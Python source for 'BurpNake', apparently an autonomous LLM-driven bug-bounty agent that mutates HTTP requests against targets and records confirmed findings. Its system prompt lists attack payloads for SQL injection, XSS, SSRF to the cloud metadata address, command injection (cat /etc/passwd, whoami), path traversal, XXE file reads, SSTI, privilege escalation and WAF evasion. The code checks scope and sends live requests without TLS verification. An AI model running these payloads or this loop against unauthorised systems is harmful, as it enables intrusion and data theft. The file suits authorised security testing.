import asyncio, json, logging, re, base64
from typing import Optional

logger = logging.getLogger("burpnake.agent")

MAX_ITERATIONS = 5
ITER_DELAY = 2.0
AGENT_TIMEOUT = 600

class AgentResult:
    def __init__(self, success, finding_id, iterations, summary, payload_history):
        self.success = success
        self.finding_id = finding_id
        self.iterations = iterations
        self.summary = summary
        self.payload_history = payload_history

AGENT_SYSTEM_PROMPT = r'''You are BurpNake, an elite, autonomous bug bounty exploitation engine running in a feedback loop.
Your core objective is to decisively confirm vulnerabilities without causing destructive impact.

Output ONLY valid JSON with these EXACT fields (no markdown blocks around it):
{
  "decision": "try_payload" | "confirmed" | "give_up",
  "reasoning": "Deep Chain-of-Thought: What exactly do you see in the headers/body? Why did the previous payload fail/succeed? What is the logical next step?",
  "payload_modifications": {
    "method": "optional (e.g. GET/POST/PUT)",
    "path": "optional (e.g. /api/v1/users/1' OR '1'='1)",
    "headers": {"optional": "headers like X-Forwarded-For, Content-Type"},
    "body": "optional new body"
  },
  "macro_modifications": [
    {
      "step_description": "What this step does",
      "method": "POST",
      "path": "/api/users",
      "body": "{\"username\":\"test\"}",
      "headers": {},
      "extractors": [{"from": "response_json", "key": "id", "store_as": "user_id"}]
    },
    {
      "step_description": "Use the state from step 1",
      "method": "GET",
      "path": "/api/users/{{user_id}}"
    }
  ],
  "payload_description": "What specific attack vector and bypass technique does this test?",
  "success_indicators": ["strings, regex, or behaviors that will absolutely confirm success in the next response"],
  "poc_curl": "A working curl command that proves the finding (only if confirmed)",
  "poc_python": "A working python requests script (only if confirmed)",
  "severity": "critical|high|medium|low",
  "bounty_estimate": "-"
}

NOTE: You can provide EITHER 'payload_modifications' (for a single request) OR 'macro_modifications' (a JSON array for multi-step stateful attacks where cookies/sessions are preserved between steps). DO NOT provide both.

CRITICAL EXPLOITATION RULES (FLAWLESS EXECUTION):
1. SQLi: Start with basic error triggers (', ", \, ;). If errors (SQL syntax, trace) appear -> "confirmed". If blocked, try time-based (WAITFOR DELAY, pg_sleep) or boolean inference.
2. XSS: Check reflection context. If reflected inside a script tag, break out ";alert(1)//. If HTML, try <svg/onload=alert(1)>. If reflected unencoded -> "confirmed".
3. SSRF: Inject localhost, 169.254.169.254, or an external burp collaborator/webhook URL.
4. RCE/Command Injection: Use sleep (e.g., sleep 5), DNS resolution (ping -c 1 YOUR_DOMAIN), or output confirmation (cat /etc/passwd, whoami).
5. LFI/Path Traversal: Try ../../../../etc/passwd or ....//....//windows/win.ini.
6. XXE: Use <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>.
7. SSTI: Inject ${7*7}, {{7*7}}, or <%= 7*7 %>. If output contains 49 -> "confirmed".
8. Mass Assignment / IDOR: Modify user IDs or inject privilege escalation parameters ("is_admin": true, "role": "admin").
9. WAF/CDN Bypass: If you see 403 Forbidden / Cloudflare / Akamai blocks, DO NOT repeat the payload. USE EVASION: HTTP Parameter Pollution (HPP), Unicode normalization, Chunked Encoding, or null bytes (%00).
10. If the exact same payload is repeated, you are failing. Always mutate the payload based on the last response.
11. If the target returns 500 Internal Server Error with a stack trace revealing code/database details, it is a confirmed Information Disclosure / Error-based vulnerability at minimum.
12. Be extremely specific to the contextual behavior you observe. Assume nothing. Prove everything.'''

class AutonomousAgent:
    def __init__(self, llm_gateway, request_replayer):
        self.llm = llm_gateway
        self.replayer = request_replayer

    async def hunt(self, exchange_db_row, matched_vulns, broadcast_fn):
        try:
            return await asyncio.wait_for(
                self._hunt_loop(exchange_db_row, matched_vulns, broadcast_fn),
                timeout=AGENT_TIMEOUT,
            )
        except asyncio.TimeoutError:
            logger.warning(f"[Agent] Hunt timed out for {exchange_db_row.get('id')}")
            from app.modules.database import get_db
            try:
                conn = get_db(); conn.execute("UPDATE exchanges SET ai_analyzed=1 WHERE id=?", (exchange_db_row.get("id"),)); conn.commit(); conn.close()
            except Exception: pass
            return AgentResult(False, None, 0, "Agent timed out", [])
        except Exception as e:
            logger.error(f"[Agent] Hunt error: {e}", exc_info=True)
            from app.modules.database import get_db
            try:
                conn = get_db(); conn.execute("UPDATE exchanges SET ai_analyzed=1 WHERE id=?", (exchange_db_row.get("id"),)); conn.commit(); conn.close()
            except Exception: pass
            return AgentResult(False, None, 0, f"Agent error: {e}", [])

    async def _hunt_loop(self, ex, matched_vulns, broadcast_fn):
        from app.modules.database import save_finding, get_db
        eid = ex.get("id", "unknown")
        host = ex.get("host", "")
        path = ex.get("path", "")
        method = ex.get("method", "GET")
        req_text = _decode_b64(ex.get("request_b64", ""))
        res_text = _decode_b64(ex.get("response_b64", ""))
        payload_history = []
        current_req_text = req_text
        current_res_text = res_text

        await broadcast_fn("agent_started", {
            "exchange_id": eid, "host": host, "path": path, "vulns": matched_vulns,
            "msg": f"🤖 Agent: {method} {path} → {', '.join(matched_vulns[:3])}",
        })

        system_override = ""

        for iteration in range(1, MAX_ITERATIONS + 1):
            logger.info(f"[Agent] {eid} — Iter {iteration}/{MAX_ITERATIONS}")
            ai_prompt = _build_iteration_prompt(
                req_text, res_text, current_req_text, current_res_text,
                matched_vulns, payload_history, iteration, system_override
            )
            system_override = "" # Reset override
            
            try:
                ai_raw = await asyncio.wait_for(
                    self.llm.generate(ai_prompt, system=AGENT_SYSTEM_PROMPT, temperature=0.2),
                    timeout=120,
                )
                ai_decision = _parse_agent_json(ai_raw)
            except asyncio.TimeoutError:
                await broadcast_fn("agent_llm_timeout", {"exchange_id": eid, "iteration": iteration,
                    "msg": f"⏳ LLM zaman aşımı (iter {iteration})"})
                break
            except Exception as e:
                logger.error(f"[Agent] LLM error: {e}")
                break

            decision = ai_decision.get("decision", "give_up")
            reasoning = ai_decision.get("reasoning", "")
            payload_desc = ai_decision.get("payload_description", "")
            mods = ai_decision.get("payload_modifications", {})

            await broadcast_fn("agent_iteration", {
                "exchange_id": eid, "iteration": iteration, "decision": decision,
                "reasoning": reasoning[:500], "payload_description": payload_desc,
                "msg": f"🔄 İter {iteration}: {decision} — {payload_desc[:80]}",
            })

            if decision == "confirmed":
                poc_curl = ai_decision.get("poc_curl", "")
                poc_python = ai_decision.get("poc_python", "")
                severity = ai_decision.get("severity", "high")
                bounty = ai_decision.get("bounty_estimate", "Unknown")
                vuln_title = f"[{severity.upper()}] {', '.join(matched_vulns[:2])} — {method} {path}"
                full_report = _build_finding_report(
                    vuln_title, reasoning, payload_history, poc_curl, poc_python,
                    bounty, req_text, res_text, current_req_text, current_res_text,
                )
                fid = save_finding({
                    "exchange_id": eid, "program_id": ex.get("program_id", ""),
                    "title": vuln_title, "severity": severity,
                    "description": reasoning[:3000], "steps_to_test": full_report,
                    "impact": f"Tahmini Bounty: {bounty}",
                    "ai_provider": getattr(self.llm, "last_used", "ai"),
                    "confirmed": 1
                })
                try:
                    conn = get_db(); conn.execute("UPDATE exchanges SET interest_level='confirmed', ai_analyzed=1 WHERE id=?", (eid,)); conn.commit(); conn.close()
                except Exception as db_e: logger.error(f"DB lock on update: {db_e}")
                
                await broadcast_fn("agent_confirmed_finding", {
                    "exchange_id": eid, "finding_id": fid, "title": vuln_title,
                    "severity": severity, "bounty_estimate": bounty, "iterations_used": iteration,
                    "poc_curl": poc_curl[:500] if poc_curl else "",
                    "msg": f"🎯 AÇIK BULUNDU! [{severity.upper()}] {method} {path} — {bounty}",
                })
                logger.info(f"[Agent] ✅ Finding confirmed! ID={fid}")
                payload_history.append({
                    "iteration": iteration, "decision": decision,
                    "reasoning": reasoning, "payload_description": payload_desc, "modifications": mods,
                })
                return AgentResult(True, fid, iteration, vuln_title, payload_history)

            elif decision == "give_up":
                await broadcast_fn("agent_gave_up", {
                    "exchange_id": eid, "iterations_used": iteration, "reason": reasoning[:300],
                    "msg": f"🔍 Agent bitti ({iteration} iter): {reasoning[:100]}",
                })
                break

            elif decision == "try_payload":
                if not mods:
                    continue
                try:
                    new_req_text, new_res_text = await _send_modified_request(ex, mods, current_req_text)
                    current_req_text = new_req_text
                    current_res_text = new_res_text
                    success_indicators = ai_decision.get("success_indicators", [])
                    auto_confirmed = _check_success_indicators(new_res_text, success_indicators)
                    
                    payload_history.append({
                        "iteration": iteration, "decision": decision,
                        "reasoning": reasoning, "payload_description": payload_desc, 
                        "modifications": mods, "result_preview": new_res_text[:200]
                    })
                    
                    await broadcast_fn("agent_request_sent", {
                        "exchange_id": eid, "iteration": iteration,
                        "payload_description": payload_desc,
                        "response_preview": new_res_text[:300],
                        "auto_confirmed": auto_confirmed,
                        "msg": f"📤 İstek gönderildi: {payload_desc[:60]}",
                    })
                    
                    if auto_confirmed:
                        system_override = "\n\n[SYSTEM] SUCCESS INDICATORS MATCHED! The vulnerability is confirmed. In your next response, MUST output 'decision': 'confirmed' and provide poc_curl and poc_python."
                        
                except Exception as e:
                    logger.error(f"[Agent] Request failed: {e}")
                    payload_history.append({
                        "iteration": iteration, "decision": decision,
                        "reasoning": reasoning, "payload_description": payload_desc, 
                        "modifications": mods, "result_preview": f"Error: {e}"
                    })
                    current_res_text = f"HTTP/1.1 000 Network Error\r\n\r\nError executing request: {e}"
                    await broadcast_fn("agent_request_failed", {
                        "exchange_id": eid, "iteration": iteration,
                        "error": str(e)[:200], "msg": f"❌ İstek başarısız: {str(e)[:60]}",
                    })
                await asyncio.sleep(ITER_DELAY)

        # Mark as analyzed to prevent infinite loop
        from app.modules.database import get_db
        try:
            conn = get_db(); conn.execute("UPDATE exchanges SET ai_analyzed=1 WHERE id=?", (eid,)); conn.commit(); conn.close()
        except Exception: pass
        
        return AgentResult(False, None, len(payload_history),
                           f"No finding after {len(payload_history)} iterations", payload_history)


async def _send_macro_requests(ex, macros, base_req_text):
    import httpx, json
    from app.modules.scope_manager import scope_manager
    host = ex.get("host", "")
    url_base = ex.get("url", "")
    protocol = "https" if ":443" in host or url_base.startswith("https") else "http"
    clean_host = host.replace(":443", "").replace(":80", "")
    
    original_headers = _parse_headers_from_raw(base_req_text)
    
    extracted_state = {}
    last_req_text = ""
    last_res_text = ""
    
    async with httpx.AsyncClient(timeout=httpx.Timeout(15.0), follow_redirects=False, verify=False) as client:
        for step in macros:
            method = step.get("method", "GET")
            path = step.get("path", "/")
            
            # Inject state variables into path
            for k, v in extracted_state.items():
                path = path.replace(f"{{{{{k}}}}}", str(v))
                
            if path and not path.startswith("/"):
                path = "/" + path
            target_url = f"{protocol}://{clean_host}{path}"
            
            if not scope_manager.is_in_scope(target_url):
                raise ValueError(f"Target URL {target_url} is out of scope!")

            extra_headers = step.get("headers", {})
            merged_headers = {**original_headers, **extra_headers} if isinstance(extra_headers, dict) else original_headers
            send_headers = {k: str(v) for k, v in merged_headers.items() if k.lower() not in ("content-length", "host", "transfer-encoding")}
            
            body = step.get("body", "")
            if isinstance(body, dict):
                body = json.dumps(body)
            # Inject state variables into body
            for k, v in extracted_state.items():
                body = body.replace(f"{{{{{k}}}}}", str(v))

            resp = await client.request(
                method=method, url=target_url, headers=send_headers,
                content=body.encode("utf-8", errors="replace") if body else None,
            )
            
            # Extraction logic
            extractors = step.get("extractors", [])
            for ext in extractors:
                if ext.get("from") == "response_json":
                    try:
                        j = resp.json()
                        val = j.get(ext.get("key"))
                        if val is not None:
                            extracted_state[ext.get("store_as")] = val
                    except Exception: pass
            
            # Build text for logging
            last_req_text = f"{method} {path} HTTP/1.1\r\nHost: {clean_host}\r\n"
            for k, v in send_headers.items(): last_req_text += f"{k}: {v}\r\n"
            if body: last_req_text += f"\r\n{body}"
                
            last_res_text = f"HTTP/1.1 {resp.status_code} {resp.reason_phrase}\r\n"
            for k, v in resp.headers.items(): last_res_text += f"{k}: {v}\r\n"
            last_res_text += f"\r\n{resp.text[:5000]}"
            
    return last_req_text, last_res_text

async def _send_modified_request(ex, mods, base_req_text):
    import httpx
    from app.modules.scope_manager import scope_manager
    host = ex.get("host", "")
    method = mods.get("method", ex.get("method", "GET"))
    path = mods.get("path", ex.get("path", "/"))
    original_headers = _parse_headers_from_raw(base_req_text)
    original_body = _parse_body_from_raw(base_req_text)
    
    extra_headers = mods.get("headers", {})
    if isinstance(extra_headers, dict):
        merged_headers = {**original_headers, **extra_headers}
    else:
        merged_headers = original_headers
        
    body = mods.get("body", original_body)
    if isinstance(body, dict):
        body = json.dumps(body)
        
    url_base = ex.get("url", "")
    protocol = "https" if ":443" in host or url_base.startswith("https") else "http"
    clean_host = host.replace(":443", "").replace(":80", "")
    if path and not path.startswith("/"):
        path = "/" + path
    target_url = f"{protocol}://{clean_host}{path}"
    
    # Check scope
    if not scope_manager.is_in_scope(target_url):
        raise ValueError(f"Target URL {target_url} is out of scope!")

    async with httpx.AsyncClient(timeout=httpx.Timeout(15.0), follow_redirects=False, verify=False) as client:
        send_headers = {k: str(v) for k, v in merged_headers.items()
                        if k.lower() not in ("content-length", "host", "transfer-encoding")}
        resp = await client.request(
            method=method, url=target_url, headers=send_headers,
            content=body.encode("utf-8", errors="replace") if body else None,
        )
    
    new_req_text = f"{method} {path} HTTP/1.1\r\nHost: {clean_host}\r\n"
    for k, v in send_headers.items():
        new_req_text += f"{k}: {v}\r\n"
    if body:
        new_req_text += f"\r\n{body}"
        
    new_res_text = f"HTTP/1.1 {resp.status_code} {resp.reason_phrase}\r\n"
    for k, v in resp.headers.items():
        new_res_text += f"{k}: {v}\r\n"
    new_res_text += f"\r\n{resp.text[:5000]}"
    return new_req_text, new_res_text

def _build_iteration_prompt(orig_req, orig_res, cur_req, cur_res, matched_vulns, history, iteration, system_override):
    history_text = ""
    if history:
        history_text = "\n\n=== PREVIOUS ATTEMPTS ===\n"
        for h in history:
            history_text += f"\nIter {h['iteration']}: {h.get('payload_description','N/A')}\nMods: {json.dumps(h.get('modifications',{}))}\nReasoning: {h.get('reasoning','')[:300]}\nResult Preview: {h.get('result_preview', '')}\n---"
    return f'''=== AUTONOMOUS HUNT — ITERATION {iteration}/{MAX_ITERATIONS} ===
DETECTED VULNS: {', '.join(matched_vulns)}

=== ORIGINAL REQUEST ===
{orig_req[:2000]}

=== LATEST REQUEST (last sent) ===
{cur_req[:2000]}

=== LATEST RESPONSE (what we got) ===
{cur_res[:2000]}
{history_text}
{system_override}
Output valid JSON only, no markdown fences.'''

def _decode_b64(b64_str):
    try:
        return base64.b64decode(b64_str or "").decode("utf-8", errors="ignore")
    except Exception:
        return b64_str or ""

def _parse_agent_json(raw):
    raw = re.sub(r"^`(?:json)?\s*", "", raw, flags=re.MULTILINE)
    raw = re.sub(r"`\s*$", "", raw, flags=re.MULTILINE)
    raw = raw.strip()

    m = re.search(r'\{[\s\S]*\}', raw)
    if m:
        try:
            return json.loads(m.group())
        except json.JSONDecodeError:
            pass
            
    if "confirmed" in raw.lower() and "unconfirmed" not in raw.lower() and "not confirmed" not in raw.lower():
        return {"decision": "confirmed", "reasoning": raw[:500], "payload_modifications": {}}
    return {"decision": "give_up", "reasoning": f"Cannot parse JSON: {raw[:200]}", "payload_modifications": {}}

def _check_success_indicators(response_text, indicators):
    if not indicators:
        return False
    rt = response_text.lower()
    if isinstance(indicators, str):
        return indicators.lower() in rt
    for ind in indicators:
        if isinstance(ind, str) and ind and ind.lower() in rt:
            return True
    return False

def _parse_headers_from_raw(raw):
    headers = {}
    lines = raw.split("\n")
    for line in lines[1:]:
        line = line.strip()
        if not line:
            break
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip()] = v.strip()
    return headers

def _parse_body_from_raw(raw):
    for sep in ("\r\n\r\n", "\n\n"):
        idx = raw.find(sep)
        if idx >= 0:
            return raw[idx + len(sep):]
    return ""

def _build_finding_report(title, reasoning, history, poc_curl, poc_python, bounty,
                           orig_req, orig_res, final_req, final_res):
    hist_md = ""
    for h in history:
        hist_md += f"\n### Iter {h['iteration']}: {h.get('payload_description','N/A')}\n**Karar:** {h.get('decision','N/A')}\n**Mantık:** {h.get('reasoning','')[:400]}\n---"
    return f'''# {title}

## 🎯 AI Analiz (Chain-of-Thought)
{reasoning}

## 💰 Tahmini Bounty
{bounty}

## 🔄 Agent İterasyon Geçmişi
{hist_md}

## 📤 Orijinal İstek
`http
{orig_req[:1500]}
`

## 📥 Orijinal Yanıt
`http
{orig_res[:1500]}
`

## 🎯 Açığı Doğrulayan Son İstek
`http
{final_req[:1500]}
`

## ✅ Açığı Doğrulayan Son Yanıt
`http
{final_res[:1500]}
`

## 🛠️ PoC — cURL
`ash
{poc_curl}
`

## 🐍 PoC — Python
`python
{poc_python}
`
'''

autonomous_agent: AutonomousAgent | None = None

def init_agent(llm_gateway, request_replayer):
    global autonomous_agent
    autonomous_agent = AutonomousAgent(llm_gateway, request_replayer)
    return autonomous_agent